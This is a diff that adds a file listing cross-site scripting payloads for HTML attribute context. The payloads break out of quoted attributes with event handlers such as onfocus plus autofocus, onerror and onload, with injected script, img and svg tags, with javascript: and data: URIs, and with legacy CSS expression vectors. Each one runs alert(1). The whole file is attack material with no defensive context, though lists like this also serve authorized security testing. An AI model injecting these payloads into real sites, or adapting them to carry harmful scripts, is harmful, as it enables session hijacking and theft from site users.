@@ -1,0 +1,27 @@
+# XSS Payloads for HTML Attribute Context
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onblur="alert(1)" autofocus="
+" onclick="alert(1)
+" onmouseenter="alert(1)
+" onmousemove="alert(1)
+" onerror="alert(1)
+" onload="alert(1)
+" onanimationstart="alert(1)" style="animation-name:x
+" ontransitionend="alert(1)" style="transition:all 1s" style="width:0
+" accesskey="x" onclick="alert(1)
+" autofocus onfocus="alert(1)
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><script>alert(1)</script>
+' onmouseover='alert(1)
+' onfocus='alert(1)' autofocus='
+" style="background:url('javascript:alert(1)')
+" style="width:expression(alert(1))
+" style="behavior:url(xss.htc)
+javascript:alert(1)//
+data:text/html,<script>alert(1)</script>
+" tabindex="1" onfocus="alert(1)
+" draggable="true" ondragstart="alert(1)
+" contenteditable="true" onblur="alert(1)
